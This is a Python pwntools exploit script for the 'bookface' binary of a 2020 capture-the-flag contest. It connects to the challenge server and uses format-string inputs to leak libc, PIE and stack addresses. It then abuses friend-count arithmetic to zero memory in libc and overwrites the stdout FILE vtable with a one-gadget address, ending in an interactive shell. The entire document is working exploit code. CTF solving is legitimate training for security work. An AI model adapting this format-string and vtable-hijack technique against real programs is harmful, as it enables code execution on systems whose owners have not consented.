from pwn import *

# p = process(["./bookface"])
# p = gdb.debug(["./bookface"])
# p = remote("localhost", 1337)
p = remote("pwn.2020.chall.actf.co", 20733)

user_id = "23233"
user_id_2 = "124414124"


def log_out():
    p.sendline("4")


def write_zero(us_id=user_id):
    log_out()
    p.sendline(us_id)
    p.sendline("0" * 9)
    p.sendline("0" * 9 + "\n\n")


def make_friends(amount):
    p.sendline("1")
    p.sendline(str(amount / 8))


def remove_friends(amount):
    p.sendline("2")
    p.sendline(str(amount / 8))


def get_friends():
    friends = 0
    while friends == 0:
        p.recvuntil("You have ")
        friends = int(p.recvuntil(" friends")[:-len(" friends")])
    return friends


clear_friends = lambda: remove_friends(get_friends())

p.sendline(user_id)
p.sendline("AAAAAAAA")
log_out()

p.sendline(user_id)
p.sendline("%llx     ")
p.recvuntil("again:\n")
_IO_2_1_stdout_ = int(p.recvline(), 16) - 131
log.info("_IO_2_1_stdout_: {}".format(hex(_IO_2_1_stdout_)))
libc_base = _IO_2_1_stdout_ - 0x3c5620
log.info("libc base: {}".format(hex(libc_base)))
p.sendline("10\n10\n10\n10")

log_out()
p.sendline(user_id)
p.sendline("%15$llx  ")
p.recvuntil("again:\n")
pie_base = int(p.recvline(), 16) - 0x11b0
log.info("PIE base: {}".format(hex(pie_base)))
p.sendline("10\n10\n10\n10")

log_out()
p.sendline(user_id)
p.sendline("%20$llx  ")
p.recvuntil("again:\n")
base_pointer = int(p.recvline(), 16) - 0x70
log.info("base pointer address: {}".format(hex(base_pointer)))
p.sendline("10\n10\n10\n10")

# WRITE TAKES PLACE AFTER RAND!!!!!!!!!
ui.pause()

make_friends(libc_base + 0x3c40c8)  # unsafe_state->fptr
write_zero()

clear_friends()
make_friends(libc_base + 0x3c40c0)
# c8 and bc
# mmap
write_zero()

ui.pause()

clear_friends()
make_friends(libc_base + 0x3c40d0)
# cc and c0
# mmap
write_zero()

ui.pause()

log_out()
p.sendline(user_id_2)
p.sendline(p64(libc_base + 0x4526a) * 32)  # one gadget
# d0 and c4
ui.pause()
make_friends(libc_base + 0x3c56f8)  # overwrite _IO_2_1_stdout.vtable
write_zero(us_id=user_id_2)

p.interactive()
# login+926
